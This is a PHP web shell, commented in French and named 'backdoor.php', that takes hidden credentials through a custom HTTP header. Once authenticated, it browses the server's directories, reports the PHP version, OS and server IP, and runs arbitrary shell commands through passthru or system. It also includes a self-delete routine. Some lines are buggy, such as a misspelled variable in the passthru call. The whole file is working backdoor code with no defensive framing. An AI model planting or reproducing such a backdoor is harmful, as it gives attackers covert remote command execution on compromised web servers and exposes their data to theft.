<?php 


	//Stock le nom de l'user
	$usr="a2250d7958f88fb6c4f9219e029602fd";
	//Stock le password de l'user
	$pass="a2250d7958f88fb6c4f9219e029602fd";
	//Stock le nom de la backdoor
	$backdoor_name="backdoor.php";
	
	
	//Backdoor
	
	Function ParcourDossier($originDirectory,$printDistance=1){
		
		$leftWhiteSpace = "";
		
		for ($i=0; $i < $printDistance; $i++)
		{
		$leftWhiteSpace = $leftWhiteSpace."&nbsp;";
		};
		
		$Actuel = dir($originDirectory);
		while($entry=$Actuel->read())
		{
			if($entry != "." && $entry != "..")
			{
				if(is_dir($originDirectory.DIRECTORY_SEPARATOR.$entry)) //USEFULL :D DIRECTORY_SEPARATOR
				{
				$em=$originDirectory.DIRECTORY_SEPARATOR.$entry;
					echo $leftWhiteSpace."<a href='user.php?Action=Dossier&arg=".$em."'><b>".$entry."</b></a><br>\n";
					ParcourDossier($originDirectory.DIRECTORY_SEPARATOR.$entry,$printDistance+2);
				}
				
				else if (!is_dir($entry))
				{
						$chemin="http://".$_SERVER['SERVER_ADDR'].DIRECTORY_SEPARATOR.$originDirectory.DIRECTORY_SEPARATOR.$entry;			
								
					$droits=@substr(sprintf('%o', fileperms($entry)), -1);
					// echo $droits;
					if ($droits==0)
					{
						 echo "<pre style='color:grey'><a style='color:grey' href='$chemin'>$leftWhiteSpace $entry</a></pre>";
					}
					if ($droits==1)
					{
						 echo "<pre style='color:yellow'><a style='color:yellow' href='$chemin'>$leftWhiteSpace $entry</a></pre>";
					}
					if ($droits==2)
					{
						 echo "<pre style='color:red'><a style='color:red' href='$chemin'>$leftWhiteSpace $entry</a></pre>";
					}
					if ($droits==3)
					{
						 echo "<pre style='color:orange'><a style='color:orange' href='$chemin'>$leftWhiteSpace $entry</a></pre>";
					}
					if ($droits==4)
					{
						 echo "<pre style='color:blue'><a style='color:blue' href='$chemin'>$leftWhiteSpace $entry</a></pre>";
					}
					if ($droits==5)
					{
						 echo "<pre style='color:green'><a style='color:green' href='$chemin'>$leftWhiteSpace $entry</a></pre>";
					}
					if ($droits==6)
					{
						 echo "<pre style='color:violet'><a style='color:violet' href='$chemin'>$leftWhiteSpace $entry</a></pre>";
					}
					if ($droits==7)
					{
						 echo "<pre style='color:black'><a style='color:black' href='$chemin'>$leftWhiteSpace $entry</a></pre>";
					}

				}
			}
		}
		$Actuel->close();
		
		if($printDistance==0)echo "</div>";
	}
	
	Function Infos(){
		echo "Version PHP :".phpversion()."
		<br/>
		OS : ".php_uname()."
		<br/>";
		echo $_SERVER['SERVER_ADDR'];
	}
	
	Function Commandes_System($commande){
				
		if(function_exists(passthru))
		{
			$page=passthru($commade,$ext);
		}
		elseif(!function_exists(passthru) && function_exists(system))
		{
			$page=system($commande,$ext);
		}
		if(isset($page))
		{
			return $page;
		}
	
	}
	Function Delete_Backdoor(){
		unlink($backdoor_name);
	}
	
	$connect=false;
	// echo parse_str($_SERVER['HTTP_CTR'],$_CTR);
	parse_str($_SERVER['HTTP_CTR'],$_CTR);
		//Connection
	if(isset($_CTR['user']) && (md5($_CTR['user'])==$usr) && isset($_CTR['pass']) && $_CTR['pass']==$pass)
	{
		$connect=true;
	}
	//Verification connection
	if(isset($_CTR['try']) && $_CTR['try']=="connect")
		{
			if($connect==true)
			{
				echo "<center> Good Logs, Connection OK </center>";
			}
		}
		
	if ($connect==true)
	{
		if(isset($_CTR['info']) && $_CTR['info']=="yes")
		{
			Infos();
		}
		if(isset($_CTR['action']) && $_CTR['action']=="Dossier")
		{
			if(isset($_CTR['arg']) && $_CTR['arg']!='')
			{
				ParcourDossier($_CTR['arg']);
			}
			else
			{
				ParcourDossier('.');		
			}
		}
		if(isset($_CTR['action']) && $_CTR['action']=="Proxy")
		{
			echo "<center> Proxy A configurer .... </center>";

		}
		if(isset($_CTR['action']) && $_CTR['action']=="Commandes")
		{
			if(isset($_CTR['arg']) && $_CTR['arg']!='')
			{
				$page=Commandes_System($_CTR['arg']);			
			}
		}
	// More tricks here.	
		
	}
?>